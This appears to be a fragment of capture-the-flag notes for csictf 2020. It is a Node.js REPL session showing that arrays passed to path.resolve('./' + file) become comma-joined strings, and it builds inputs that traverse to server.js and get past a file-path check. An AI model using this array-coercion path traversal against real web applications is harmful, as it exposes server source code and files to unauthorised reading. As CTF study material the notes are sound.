In fact we are solving this 
```
> returnedFile = path.resolve('./' + file);
> file = [ '..', 'server.js' ]
[ '..', 'server.js' ]
> returnedFile = path.resolve('./' + file);
'/home/x/y/z/ctf/2020/csictf/..,server.js'
> file = [ '../', 'server.js' ]
[ '../', 'server.js' ]
> returnedFile = path.resolve('./' + file);
'/home/x/y/z/ctf/2020/,server.js'
> returnedFile = path.resolve('./' +[ '../', 'server.js' ] );
'/home/x/y/z/ctf/2020/,server.js'
> returnedFile = path.resolve('./' +[ '','../', 'server.js' ] );
'/home/x/y/z/ctf/2020/csictf/,../,server.js'
> returnedFile = path.resolve('./' +[ '','/../', 'server.js' ] );
'/home/x/y/z/ctf/2020/csictf/,server.js'
> returnedFile = path.resolve('./' +[ 'server.js','/../' ] );
'/home/x/y/z/ctf/2020/csictf'
> returnedFile = path.resolve('./' +[ 'server.js','/../','/..' ] );
'/home/x/y/z/ctf/2020/csictf'
> returnedFile = path.resolve('./' +[ 'server.js','/../','/../server.js' ] );
'/home/x/y/z/ctf/2020/csictf/server.js'
> returnedFile = path.resolve('./' +[ '','/../','/../server.js' ] );
'/home/x/y/z/ctf/2020/csictf/server.js'
> returnedFile = path.resolve('./' +[ '','/../','/../','/../server.js' ] );
'/home/x/y/z/ctf/2020/csictf/server.js'
> returnedFile = path.resolve('./' +[ '','/../','/../','/../','/../server.js' ] );
'/home/x/y/z/ctf/2020/csictf/server.js'
> returnedFile = path.resolve('./' +[ '','','','','/server.js' ] );
'/home/x/y/z/ctf/2020/csictf/,,,,/server.js'
> returnedFile = path.resolve('./' +[ '','','','','/../server.js' ] );
'/home/x/y/z/ctf/2020/csictf/server.js'
```